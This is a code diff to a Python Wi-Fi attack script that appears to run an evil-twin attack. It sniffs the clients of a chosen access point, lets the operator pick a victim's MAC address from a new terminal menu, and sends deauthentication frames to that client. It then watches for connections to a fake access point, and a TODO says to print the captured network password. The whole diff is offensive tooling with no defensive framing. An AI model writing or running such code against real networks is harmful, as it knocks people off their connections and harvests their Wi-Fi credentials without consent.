@@ -10,6 +10,7 @@ import pdb
 import os
 from loguru import logger
 from subprocess import run
+from simple_term_menu import TerminalMenu
 
 # initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -32,7 +33,7 @@ def check_for_connection():
             client_mac = line.split()[7]
             if client_mac not in conn:
                 conn.append(client_mac)
-                logger.info(f"{client_mac} Client connected!")
+                logger.info(f"\n{client_mac} Client connected!")
         time.sleep(1)
 
 def callback(packet):
@@ -126,21 +127,25 @@ if __name__ == "__main__":
     ssid_to_scan = input()
     bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
 
-    logger.info(f'Start scanning clients on {bssid_to_scan}')
+    logger.info(f'Start scanning clients on \"{ssid_to_scan}\" {bssid_to_scan}')
     sniff(prn=get_AP_clients, monitor=True, timeout=20)
-    isSniffing = False
+    isSniffing = False # for the change_channel thread
 
     
-    os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")
+    # os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")
 
     # start the thread that prints all the connected clients
     printer = Thread(target=check_for_connection)
     printer.daemon = True
     printer.start()
 
-    logger.info(f"clients connected to the AP you choose: {clients}")
     logger.info("please choose a client MAC to deauth: ")
-    target_mac = input()
+    # clients set to list 
+    clients = list(clients)
+    terminal_menu = TerminalMenu(clients)
+    choice_index = terminal_menu.show()
+    target_mac = clients[choice_index]
+
     deauth_target(target_mac, bssid_to_scan)
 
     check_fake_ap_connections = False
@@ -148,4 +153,4 @@ if __name__ == "__main__":
     # TODO: print the ap password
     
 
-    pdb.set_trace()
+    # pdb.set_trace()
